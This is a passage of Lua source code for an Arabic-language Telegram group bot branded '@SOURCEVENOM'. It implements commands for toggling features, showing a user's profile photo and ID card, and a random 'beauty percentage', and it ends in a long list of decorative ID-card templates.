Text = '\n 𖥔 تم تعطيل امر مين ضافني '
else
Text = '\n 𖥔 بالتاكيد تم تعطيل امر مين ضافني '
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل صيح' and Manager(msg) then   
if database:get(bot_id..'Seh:User'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل امر صيح'
database:del(bot_id..'Seh:User'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تنزيل الرتب' and BasicConstructor(msg) then  
database:del(bot_id..'Constructor'..msg.chat_id_)
database:del(bot_id..'Manager'..msg.chat_id_)
database:del(bot_id..'Mod:User'..msg.chat_id_)
database:del(bot_id..'Special:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖥔 تم مسح تلكل ')
end
if text == 'تعطيل صيح' and Manager(msg) then  
if not database:get(bot_id..'Seh:User'..msg.chat_id_) then
database:set(bot_id..'Seh:User'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل امر صيح'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل امر صيح'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تفعيل اطردني' and Manager(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' 𖥔 تم تفعيل امر اطردني إلى عايز يخرج يتنيل 😹'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' 𖥔 بالتاكيد تم تفعيل امر اطردني مخلاص كفايه تفعيل الأمر 😾'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل اطردني' and Manager(msg) then  
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
Text = '\n 𖥔 تم تعطيل امر اطردني اترزع هن بقى مفيش خروج 😹'
else
Text = '\n 𖥔 بالتاكيد تم تعطيل امر اطردني مفيش خروج يولاد القمر 😹'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == "صورتي"  then
local my_ph = database:get(bot_id.."my_photo:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖥔 الصوره معطله") 
return false  
end
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," 𖥔 عدد صورك ⇜ "..result.total_count_.." صوره‌‏", msg.id_, msg.id_, "md")
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
if text == "نسبه جمالي" or text == "جمالي" then
local my_ph = database:get(bot_id.."pp_photo:status"..msg.chat_id_)
if not my_ph then
send(msg.chat_id_, msg.id_," 𖥔اكتب تفعيل نسبه جمالي") 
return false  
end
if Sudo(msg) then
local function getpro(extra, result, success)
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," نسبه جمالك هي 500% \nعشان مطور وكدا لازم اطبله 😹♥\n" )
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
else
local function getpro(extra, result, success)
local nspp = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",}
local rdbhoto = nspp[math.random(#nspp)]
if result.photos_[0] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[0].sizes_[1].photo_.persistent_id_," نسبه جمالك هي "..rdbhoto.."🙄♥" )
else
send(msg.chat_id_, msg.id_,'لا تمتلك صوره في حسابك', 1, 'md')
  end end
tdcli_function ({ ID = "GetUserProfilePhotos", user_id_ = msg.sender_user_id_, offset_ = 0, limit_ = 1 }, getpro, nil)
end
end

if text == ("ايدي") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,ban,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local getbioY = getbio(msg.sender_user_id_)
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (ban.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local bana = {
	
"⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★",

"• 🖤 |𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑| 🖤 •",

}
local rdphoto = bana[math.random(#bana)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#bio',getbioY) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n     ꙰🦅 ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n• 🖤 | 𝑼𝑬𝑺 : '..username..' \n• 🖤 | 𝑴𝑺𝑮 : '..Msguser..' \n• 🖤 | 𝑺𝑻𝑨 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n• 🖤 | 𝑰𝑫 :  '..msg.sender_user_id_..' \n• 🖤 | b𝐼𝑂 : '..getbioY..' \n• 🖤 | 𝐶𝐻 : @SOURCEVENOM \n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↝  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↝ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↝   「@SOURCEVENOM」 ↝🇧??\n')
else
send(msg.chat_id_, msg.id_, '\n 𖥔 الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↝ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↝  「@SOURCEVENOM」\n')
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#bio',getbioY) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↝  '..username..' \n¦• 𝙼𝚂𝙶𝚂↝ '..Msguser..' \n¦• 𝚁𝙰𝙽𝙺↝ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n¦• 𝙸𝙳↝  '..msg.sender_user_id_..' \n¦• 𝒄𝒉↝ @SOURCEVENOM  \n')
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end

if text == ("Id") and msg.reply_to_message_id_ == 0 and not database:get(bot_id..'Bot:Id'..msg.chat_id_) then     
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da)  tdcli_function ({ ID = "SendChatAction",  chat_id_ = msg.sender_user_id_, action_ = {  ID = "SendMessageTypingAction", progress_ = 100}  },function(arg,ta)  tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)  tdcli_function ({ID = "GetUserProfilePhotos",user_id_ = msg.sender_user_id_,offset_ = 0,limit_ = 1},function(extra,ban,success) 
if da.status_.ID == "ChatMemberStatusCreator" then 
rtpa = 'المالك'
elseif da.status_.ID == "ChatMemberStatusEditor" then 
rtpa = 'مشرف' 
elseif da.status_.ID == "ChatMemberStatusMember" then 
rtpa = 'عضو'
end
local getbioY = getbio(msg.sender_user_id_)
local Msguser = tonumber(database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_) or 1) 
local nummsggp = tonumber(msg.id_/2097152/0.5)
local nspatfa = tonumber(Msguser / nummsggp * 100)
local Contact = tonumber(database:get(bot_id..'Add:Contact'..msg.chat_id_..':'..msg.sender_user_id_) or 0) 
local NUMPGAME = tonumber(database:get(bot_id..'NUM:GAMES'..msg.chat_id_..msg.sender_user_id_) or 0)
local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
local iduser = msg.sender_user_id_
local edit = tonumber(database:get(bot_id..'edits'..msg.chat_id_..msg.sender_user_id_) or 0)
local photps = (ban.total_count_ or 0)
local interaction = Total_Msg(Msguser)
local rtpg = rtpa
local bana = {
	
"⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★",

"• 🖤 |𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑| 🖤 •",

}
local rdphoto = bana[math.random(#bana)]
if not database:get(bot_id..'Bot:Id:Photo'..msg.chat_id_) then      
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#bio',getbioY) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then   
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,get_id_text)       
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_, '\n     ꙰🦅 ليس لديك صور في حسابك \n['..get_id_text..']')      
end 
end
else
if result.username_ then
username = '@'..result.username_ 
else
username = 'لا يوجد '
end
if result.status_.ID == "UserStatusRecently" and result.profile_photo_ ~= false then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, ban.photos_[0].sizes_[1].photo_.persistent_id_,''..rdphoto..'\n• 🖤 | 𝑼𝑬𝑺 : '..username..' \n• 🖤 | 𝑴𝑺𝑮 : '..Msguser..' \n• 🖤 | 𝑺𝑻𝑨 : '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n• 🖤 | 𝑰𝑫 :  '..msg.sender_user_id_..' \n• 🖤 | b𝐼𝑂 : '..getbioY..' \n• 🖤 | 𝐶𝐻 : @SOURCEVENOM \n')
else 
if result.status_.ID == "UserStatusEmpty" and result.profile_photo_ == false then
send(msg.chat_id_, msg.id_,'[\n ¦✙ بيك عزيزي 「'..Name..'」 \n¦• 𝚄𝚂𝙴𝚁 ↝  「'..Name..'」    ↝💘\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」.   ↝💘\n ¦• 𝚁𝙰𝙽𝙺↝ 「'..Rutba(msg.sender_user_id_,msg.chat_id_)..'」    ↝💘\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」    ↝💘\n¦• 𝒄𝒉↝   「@SOURCEVENOM」 ↝🇧??\n')
else
send(msg.chat_id_, msg.id_, '\n 𖥔 الصوره ⇜ ليس لديك صور في حسابك'..'[\n¦• 𝚄𝚂𝙴𝚁 ↝ 「'..username..'」\n¦• 𝙼𝚂𝙶𝚂↝ 「'..Msguser..'」\n¦• 𝙸𝙳↝  「'..msg.sender_user_id_..'」\n¦• 𝒄𝒉↝  「@SOURCEVENOM」\n')
end 
end
end
else
local get_id_text = database:get(bot_id.."KLISH:ID"..msg.chat_id_)
if get_id_text then
get_id_text = get_id_text:gsub('#rdphoto',rdphoto) 
get_id_text = get_id_text:gsub('#bio',getbioY) 
get_id_text = get_id_text:gsub('#id',iduser) 
get_id_text = get_id_text:gsub('#username',username) 
get_id_text = get_id_text:gsub('#msgs',Msguser) 
get_id_text = get_id_text:gsub('#edit',edit) 
get_id_text = get_id_text:gsub('#stast',rtp) 
get_id_text = get_id_text:gsub('#auto',interaction) 
get_id_text = get_id_text:gsub('#game',NUMPGAME) 
get_id_text = get_id_text:gsub('#photos',photps) 
send(msg.chat_id_, msg.id_,'['..get_id_text..']')   
else
send(msg.chat_id_, msg.id_,'[\n¦• 𝚄𝚂𝙴𝚁 ↝  '..username..' \n¦• 𝙼𝚂𝙶𝚂↝ '..Msguser..' \n¦• 𝚁𝙰𝙽𝙺↝ '..Rutba(msg.sender_user_id_,msg.chat_id_)..'  \n¦• 𝙸𝙳↝  '..msg.sender_user_id_..' \n¦• 𝒄𝒉↝ @SOURCEVENOM  \n')
end
end

end,nil)
end,nil)
end,nil)
end,nil)
end
end
if text == 'تغير الايدي' and Manager(msg) then 
local List = {
[[
゠𝚄𝚂𝙴𝚁 𖨈 #username 𖥲 .
゠??𝚂𝙶 𖨈 #msgs 𖥲 .
゠𝚂𝚃𝙰 𖨈 #stast 𖥲 .
゠𝙸𝙳 𖨈 #id 𖥲 .
]],
[[ 𖥔 ᴜѕᴇʀɴᴀᴍᴇ ➥• #username .
 𖥔ᴍѕɢѕ ➥• #msgs .
 𖥔 ѕᴛᴀᴛѕ ➥• #stast .
 𖥔 ʏᴏᴜʀ ɪᴅ ➥• #id  .
 𖥔ᴇᴅɪᴛ ᴍsɢ ➥• #edit .
 𖥔ᴅᴇᴛᴀɪʟs ➥• #auto . 
 𖥔 ɢᴀᴍᴇ ➥• #game .
]],
[[
➭- 𝒔𝒕𝒂𓂅 #stast 𓍯. 💕
➮- 𝒖𝒔𝒆𝒓𓂅 #username 𓍯. 💕
➭- 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯. 💕
➭- 𝒊𝒅 𓂅 #id 𓍯. 💕
]],
[[
⚕ 𓆰 𝑾𝒆𝒍𝒄𝒐𝒎𝒆 𝑻𝒐 𝑮𝒓𝒐𝒖𝒑 ★
• 🖤 | 𝑼𝑬𝑺 : #username ‌‌‏⚚
• 🖤 | 𝑺𝑻𝑨 : #stast 🧙🏻‍♂ ☥
• 🖤 | 𝑰𝑫 : #id ‌‌‏♕
• 🖤 | 𝑴𝑺𝑮 : #msgs 𓆊
]],
[[
┌ 𝐔𝐒𝐄𝐑 𖤱 #username 𖦴 .
├ 𝐌𝐒𝐆 𖤱 #msgs 𖦴 .
├ 𝐒𝐓𝐀 𖤱 #stast 𖦴 .
└ 𝐈?? 𖤱 #id 𖦴 .
]],
[[
𓄼🇮🇶 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 :#username 
𓄼🇮🇶 𝑺𝒕𝒂𝒔𝒕 :#stast 
𓄼🇮🇶 𝒊𝒅 :#id 
𓄼🇮🇶 𝑮𝒂𝒎𝒆𝑺 :#game 
𓄼🇮🇶 𝑴𝒔𝒈𝒔 :#msgs
]],
[[
- 🇨🇰 𝒖𝒔𝒆𝒓𝒏𝒂𝒎𝒆 . #username 𖣂.
- 🇨🇰 𝒔𝒕𝒂𝒔𝒕 . #stast 𖣂.
- 🇨🇰 ??𝒅 . #id 𖣂.
- 🇨🇰 𝒈𝒂𝒎𝒆𝒔 . #game ??.
- 🇨🇰 𝒎𝒔𝒈𝒔 . #msgs 𖣂.
]],
[[
𝟓 𝟔 𖡻 #username  ࿇🦄
𝟓 𝟔 𖡻 #msgs  ࿇🦄
𝟓 𝟔 𖡻 #auto  ࿇🦄
𝟓 𝟔 𖡻 #stast  ࿇🦄
𝟓 𝟔 𖡻 #id  ࿇🦄
]],
[[
金 - 𝓾𝓼𝓮𝓻𝓷𝓪𝓶𝓮 . #username ⸙ 
金 - 𝓼𝓽𝓪𝓼𝓽  . #stast ⸙ 
金 - 𝓲𝓭 . #id ⸙ 
金 - 𝓰𝓶𝓪𝓼 . #gmas ⸙ 
金 - 𝓶𝓼𝓰𝓼 . #msgs ⸙
]],
[[
🇯🇵 - 𝄬 username . #username  𓃠
🇯🇵 - 𝄬 stast . #stast  𓃠
🇯🇵 - 𝄬 id . #id 𓃠
🇯🇵 - 𝄬 gmas . #gmas 𓃠
🇯🇵 - 𝄬 msgs . #msgs  𓃠
]],
[[
𓄼🇪🇭 𝑼𝒔𝒆𝒓𝑵𝒂𝒎𝒆 : #username ♕
𓄼🇪🇭 𝑺𝒕𝒂𝒔𝒕 : #stast    ☥
𓄼🇪🇭 𝒊𝒅 : #id ‌‌‏⚚
𓄼🇪🇭 𝑮𝒂𝒎𝒆𝑺 : #edit ⚚
𓄼🇪🇭 𝑴𝒔𝒈𝒔 : #msgs 𓆊
]],
[[
➞: 𝒔𝒕𝒂𓂅 #stast 𓍯➸💞.
➞: ??𝒔𝒆𝒓𓂅 #username 𓍯➸💞.
➞: 𝒎𝒔𝒈𝒆𓂅 #msgs 𓍯➸💞.
➞: 𝒊𝒅 𓂅 #id 𓍯➸💞.
]],
[[
☆•𝐮𝐬𝐞𝐫 : #username 𖣬  
☆•𝐦𝐬𝐠  : #msgs 𖣬 
☆•𝐬𝐭𝐚 : #stast 𖣬 
☆•𝐢𝐝  : #id 𖣬
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
]],
[[
.𖣂 𝙪𝙨𝙚𝙧𝙣𝙖𝙢𝙚 , #username  
.𖣂 𝙨𝙩𝙖𝙨𝙩 , #stast  
.𖣂 𝙡𝘿 , #id  
.𖣂 𝙂𝙖𝙢𝙨 , #game 
.𖣂 𝙢𝙨𝙂𝙨 , #msgs
]],
[[
𖤍 |↶ #id    ꙰🇪🇬.
𖤍 |↶ #username    ꙰🇪🇬.
𖤍 |↶ #msgs    ꙰??🇬.
𖤍 |↶ #stast    ꙰🇪🇬.
𖤍 |↶ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
 𝗨𝗦𝗘𝗥 ⟿ #username  « 
 𝗠𝗦𝗚𝗦 ⟿  #msgs  « 
 𝗦𝗧𝗔 ⟿ #stast  « 
 𝗜𝗗  ⟿ #id  « 
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
🇪🇬≪💎≫ #username • メ
🇪🇬≪💎≫ #stast  •メ
🇪🇬≪💎≫ #id  • メ
🇪🇬≪💎≫ #msgs  •メ
🇪🇬≪💎≫ #game •メ
🇪🇬𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
 𝚄𝚂𝙴𝚁 𓄹𓄼 #username
 𝙸𝙳  ??𓄼 #id 
 𝚂𝚃𝙰 𓄹𓄼 #stast 
 𝙼𝚂𝙶𝚂𓄹𓄼 #msgs
 𝗖𝗛 - 「@SOURCEVENOM」 ??.
]],
[[
𓅓➪:ᗰᔕᘜᔕ : #msgs - ❦ .
??➪ : Iᗪ : #id - ❦ . 
𓅓➪ : ᔕTᗩᔕT : #stast - ❦ . 
𓅓➪ : ᑌᔕᖇᗴᑎᗩᗰᗴ : #username _ ❦ .
𓅓➪ : 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
- ايديڪ  ⁞ #id 💘 ٬
- يوزرڪ القميل ⁞ #username ?? ٬
- رسائلڪ  الطيفهہَ ⁞ #msgs 💘 ٬
- رتبتڪ الحلوه ⁞ #stast  💘٬
- سحڪاتڪ الفول ⁞ #edit 💘 ٬
- 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
𓁷⁦⁦ - 𝙪𝙚𝙨 †: #username 𓀀 .
𓁷 - 𝙢𝙨𝙜 † : #msgs 𓀀 .
𓁷 - 𝙨𝙩𝙖 †: #stast 𓀀  .
𓁷 - 𝙞?? †: #id 𓀀 .
𓁷 - 𝗖𝗛 - 「@SOURCEVENOM」 💞.
]],
[[
𖡋 𝐔𝐒𝐄 #username 
𖡋 𝐌𝐒𝐆 #msgs 
𖡋 𝐒𝐓𝐀 #stast 
𖡋 𝐈𝐃 #id 
𖡋 𝐄𝐃𝐈𝐓 #edit
𖡋 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
𖤂 ~ 𝑢𝑠𝑒 #username  𖤐
𖤂 ~ 𝑚??𝑔 #msgs 𖤐
𖤂 ~ 𝑠𝑡𝑎 #stast  
𖤂 ~ 𝑖𝑑 #id 𖤐
𖤂 ~ 𝑒𝑑𝑖𝑡 #edit 𖤐
𖤂 ~ 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
••• ••• ••• ••• ••• ••• ••• 
࿕ ¦• 𝙐𝙎𝙀𝙍  ⟿ #username ༆
 ࿕ ¦• 𝙈𝙎𝙂𝙎   ⟿ #msgs ༆
 ࿕ ¦• 𝙂𝙈𝘼𝙎  ⟿ #stast ༆
 ࿕ ¦• 𝙏𝘿 𝙎𝙏𝘼  ⟿ #id ༆
••• ••• ••• ••• ••• ••• •••
 ࿕ ¦• 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
► 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 #username 𓃚  ꙰
► 𝗜𝗗 #id 𓃚 ꙰
► 𝗦𝗧𝗔𝗦 #stast 𓃚 ꙰
► 𝗠𝗦𝗔𝗚 #msgs 𓃚 ꙰
► 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
-›   𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 . #username 🇪🇬 ꙰ 
-›   𝚂𝚃𝙰𝚂𝚃 . #stast 🇪🇬 ꙰
-›   𝙸𝙳 . #id 🇪🇬 ꙰ 
-›   𝙶𝙼𝙰𝚂 . #stast 🇪🇬 ꙰ 
-›   𝙼𝚂𝙶𝚂 . #msgs 🇪🇬 ꙰
-›   ??𝗛 - 「@SOURCEVENOM」 🇪🇬 ꙰.
]],
[[
- UsEr🇪🇬 ꙰ #username
- StA🇪🇬 ꙰   #msgs
- MsGs🇪🇬 ꙰ #stast
- ID🇪🇬 ꙰  #id
- 𝗖𝗛 🇪🇬 ꙰  「@SOURCEVENOM」 💞.
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝚄𝚂𝙴𝚁 ⟿ #username 💘.
🇪🇬 - ??𝚂𝙶𝚂 ⟿  #msgs 💘.
🇪🇬 - 𝙶𝙼𝙰𝚂 ⟿ #stast 💘.
🇪🇬 - 𝙸𝙳 𝚂𝚃𝙰 ⟿ #id 💘.  
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
🇪🇬 - 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
- 𓏬 𝐔𝐬𝐄𝐫 : #username 𓂅 .
- 𓏬 𝐌𝐬𝐆  : #msgs 𓂅 .
- 𓏬 𝐒𝐭𝐀 : #stast 𓂅 .
- 𓏬 𝐈𝐃 : #id 𓂅 .
- 𓏬 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
ᯓ 𝟔𝟔𝟔 𖡋 #username •✟
ᯓ 𝟔𝟔𝟔𖡋 #stast  •✟
ᯓ 𝟔𝟔𝟔𖡋 #id  • ✟
ᯓ 𝟔𝟔𝟔𖡋 #msgs  •✟ 
ᯓ 𝟔𝟔𝟔𖡋 #game •✟
ᯓ 𝟔𝟔𝟔𖡋 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
 𖥔•𝐮𝐬𝐞𝐫 : #username 𖣬  
 𖥔•𝐦𝐬𝐠  : #msgs 𖣬 
 𖥔•𝐬𝐭𝐚 : #stast 𖣬 
 𖥔•𝐢𝐝  : #id 𖣬
 𖥔•𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
- ᴜѕᴇʀɴᴀᴍᴇ ➣ #username .
- ᴍѕɢѕ ➣ #msgs .
- ѕᴛᴀᴛѕ ➣ #stast .
- ʏᴏᴜʀ ɪᴅ ➣ #id  .
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
- ᴜѕʀ: #username ঌ.
- ᴍѕɢ: #msgs  ঌ.
- ѕᴛᴀ: #stast  ঌ.
- ɪᴅ: #id ঌ.
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
- 𝑢𝑠𝑒𝑟𝑛𝑎𝑚𝑒 ⟿ #username
- 𝑚𝑠𝑔𝑠 ⟿ #msgs
- 𝑖𝑑 ⟿ #id
- 𝑒𝑑𝑖𝑡 ⟿ #edit
- 𝑔𝑎𝑚𝑒 ⟿ #game
- 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
⌔➺: Msgs : #msgs - 🔹.
⌔➺: ID : #id - 🔹.
⌔➺: Stast : #stast -🔹.
⌔➺: UserName : #username -🔹.
⌔➺: 𝗖𝗛 - 「@SOURCEVENOM」 𖥔.
]],
[[
┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉
